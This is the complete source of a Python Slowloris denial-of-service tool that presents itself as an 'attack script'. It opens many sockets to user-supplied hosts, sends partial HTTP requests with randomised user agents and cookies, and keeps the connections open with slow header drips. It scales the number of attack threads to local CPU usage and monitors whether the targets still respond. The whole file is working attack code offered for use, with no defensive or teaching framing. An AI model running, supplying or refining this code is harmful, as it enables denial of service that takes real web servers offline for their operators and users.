import socket
import random
import time
import logging
import threading
import argparse
import requests
import yaml
import os
import re
import psutil
import resource
from time import perf_counter
from urllib.parse import urlparse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_config():
    """Load configuration safely with error handling."""
    try:
        config_path = os.path.join(os.path.dirname(__file__), "config.yaml")
        with open(config_path, "r") as file:
            return yaml.safe_load(file)
    except (FileNotFoundError, yaml.YAMLError) as e:
        logging.error(f"Error loading configuration: {e}")
        # Default fallback configuration
        return {
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15'
            ]
        }

config = load_config()
user_agents = config['user_agents']

def generate_random_cookie():
    """Generate random cookie values."""
    cookie_values = ['session_id', 'auth_token', 'pref', 'id']
    cookie_parts = []
    for cookie in cookie_values:
        value = random.randint(1000, 9999)
        cookie_parts.append(f"{cookie}={value}")
    return "; ".join(cookie_parts)

def parse_host(host):
    """Parse and clean host URL, returning host, scheme and port."""
    if not host.startswith(('http://', 'https://')):
        host = 'http://' + host
    
    parsed = urlparse(host)
    scheme = parsed.scheme
    hostname = parsed.netloc
    
    # Extract port if specified in URL
    if ':' in hostname:
        hostname = hostname.split(':')[0]
    
    return hostname, scheme

def init_socket(host, port, max_retries, timeout):
    """Initialize a socket connection with retry logic."""
    hostname, _ = parse_host(host)
    retry_count = 0
    while retry_count < max_retries:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((hostname, port))
            s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {hostname}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
            s.send(f"Cookie: {generate_random_cookie()}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except socket.error as e:
            retry_count += 1
            logging.warning(f"Socket connection error ({retry_count}/{max_retries}): {e}")
            if retry_count < max_retries:
                time.sleep(1)
            else:
                logging.error(f"Failed to connect to {hostname}:{port} after {max_retries} attempts")
    return None

def send_slowloris_headers(s):
    """Send slow headers with proper error handling."""
    try:
        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        time.sleep(random.uniform(0.5, 1.5))
        return True
    except socket.error as e:
        logging.warning(f"Error sending data: {e}")
        try:
            s.close()
        except:
            pass  # Ignore errors during close
        return False

class SlowlorisAttack(threading.Thread):
    """Thread class for managing a single Slowloris attack."""
    def __init__(self, host, port, num_sockets, max_retries, timeout, wait_time):
        super().__init__()
        self.host = host
        self.port = port
        self.num_sockets = num_sockets
        self.max_retries = max_retries
        self.timeout = timeout
        self.wait_time = wait_time
        self.running = True
        self.sockets = []
        self.daemon = True  # Allow the program to exit even if this thread is running

    def run(self):
        hostname, _ = parse_host(self.host)
        logging.info(f"Starting Slowloris attack on {hostname}:{self.port} with {self.num_sockets} sockets.")

        # Initialize sockets
        for _ in range(self.num_sockets):
            if not self.running:
                break
            s = init_socket(self.host, self.port, self.max_retries, self.timeout)
            if s:
                self.sockets.append(s)

        # Main loop
        while self.running:
            logging.info(f"Sending headers slowly to {len(self.sockets)} sockets on {hostname}...")
            for s in list(self.sockets):
                if not self.running:
                    break
                success = send_slowloris_headers(s)
                if not success:
                    self.sockets.remove(s)
                    logging.warning(f"Connection to {hostname} lost. Socket removed.")

            # Maintain the number of active sockets
            while len(self.sockets) < self.num_sockets and self.running:
                s = init_socket(self.host, self.port, self.max_retries, self.timeout)
                if s:
                    self.sockets.append(s)
                    logging.info(f"Socket to {hostname} restored.")

            time.sleep(self.wait_time)

    def stop(self):
        """Stop the attack and clean up resources."""
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass  # Ignore errors during close
        self.sockets.clear()
        logging.info(f"Stopped Slowloris attack on {self.host}")

class ServerMonitor(threading.Thread):
    """Thread class for monitoring server response times."""
    def __init__(self, host):
        super().__init__()
        self.host = host
        self.running = True
        self.daemon = True

    def run(self):
        hostname, scheme = parse_host(self.host)
        url = f"{scheme}://{hostname}"
        logging.info(f"Starting to monitor server responses at {url}")
        
        while self.running:
            try:
                start_time = perf_counter()
                response = requests.get(url, timeout=10)
                end_time = perf_counter()
                response_time = end_time - start_time
                logging.info(f"Server {url} responded in {response_time:.2f} seconds with status code {response.status_code}.")
            except requests.RequestException as e:
                logging.warning(f"Error connecting to server {url}: {e}")
            
            time.sleep(10)
    
    def stop(self):
        """Stop the monitor."""
        self.running = False
        logging.info(f"Stopped monitoring server {self.host}")

def get_max_open_files():
    """Get maximum number of open files allowed by the OS."""
    try:
        soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
        logging.info(f"Soft limit for open files: {soft_limit}, Hard limit: {hard_limit}")
        return soft_limit
    except (AttributeError, ValueError) as e:
        logging.warning(f"Could not determine file limits: {e}")
        return 1000  # Reasonable default

def main():
    """Main function to parse arguments and start the attack."""
    max_open_files = get_max_open_files()
    default_sockets = max(50, max_open_files - 100)  # More conservative default

    parser = argparse.ArgumentParser(description="Slowloris Attack Script with Server Response Time Check, Cookie Support, and CPU Load Management")
    parser.add_argument("-H", "--hosts", type=str, required=True, help="Comma-separated list of hosts to attack (e.g., host1,host2,host3)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port to attack (default: 80)")
    parser.add_argument("-r", "--max-retries", type=int, default=5, help="Maximum number of retries (default: 5)")
    parser.add_argument("-t", "--timeout", type=float, default=4, help="Socket timeout in seconds (default: 4)")
    parser.add_argument("-n", "--num-sockets", type=int, default=default_sockets, help=f"Number of sockets to open (default: {default_sockets})")
    parser.add_argument("-w", "--wait", type=int, default=15, help="Time to wait between sending headers (default: 15 seconds)")
    parser.add_argument("-c", "--cpu-limit", type=float, default=70.0, help="CPU usage percentage limit (default: 70.0)")
    parser.add_argument("--max-instances", type=int, default=5, help="Maximum number of attack instances (default: 5)")
    args = parser.parse_args()

    # Validate number of sockets
    if args.num_sockets > max_open_files - 50:
        logging.warning(f"Requested {args.num_sockets} sockets exceeds safe limit. Reducing to {max_open_files - 50}")
        args.num_sockets = max_open_files - 50

    hosts = [host.strip() for host in args.hosts.split(",")]
    attack_threads = []
    monitor_threads = []

    try:
        # Start server monitors
        for host in hosts:
            monitor = ServerMonitor(host)
            monitor.start()
            monitor_threads.append(monitor)

        # Start initial attack instances
        instances_per_host = max(1, args.max_instances // len(hosts))
        for host in hosts:
            for _ in range(instances_per_host):
                attack = SlowlorisAttack(host, args.port, args.num_sockets // instances_per_host, 
                                         args.max_retries, args.timeout, args.wait)
                attack.start()
                attack_threads.append(attack)

        # Main monitoring loop
        while True:
            cpu_usage = psutil.cpu_percent(interval=1)
            logging.info(f"Current CPU usage: {cpu_usage}% (Limit: {args.cpu_limit}%)")
            
            active_attacks = sum(1 for t in attack_threads if t.is_alive())
            
            if cpu_usage < args.cpu_limit and active_attacks < args.max_instances:
                # Add another attack if CPU usage is low
                host = random.choice(hosts)
                attack = SlowlorisAttack(host, args.port, args.num_sockets // instances_per_host,
                                        args.max_retries, args.timeout, args.wait)
                attack.start()
                attack_threads.append(attack)
                logging.info(f"Started new attack instance on {host} (Total: {active_attacks + 1})")
            elif cpu_usage > args.cpu_limit * 1.1 and active_attacks > 1:
                # Remove an attack if CPU usage is too high
                for t in attack_threads:
                    if t.is_alive():
                        t.stop()
                        break
                logging.info(f"Stopped one attack instance due to high CPU usage (Total: {active_attacks - 1})")
            
            # Clean up finished threads
            attack_threads = [t for t in attack_threads if t.is_alive()]
            
            time.sleep(5)
            
    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received. Shutting down...")
    finally:
        # Clean shutdown
        logging.info("Stopping all attacks...")
        for t in attack_threads:
            t.stop()
        for m in monitor_threads:
            m.stop()
        
        logging.info("Waiting for threads to terminate...")
        for t in attack_threads + monitor_threads:
            t.join(timeout=2)
        
        logging.info("Shutdown complete.")

if __name__ == "__main__":
    main()
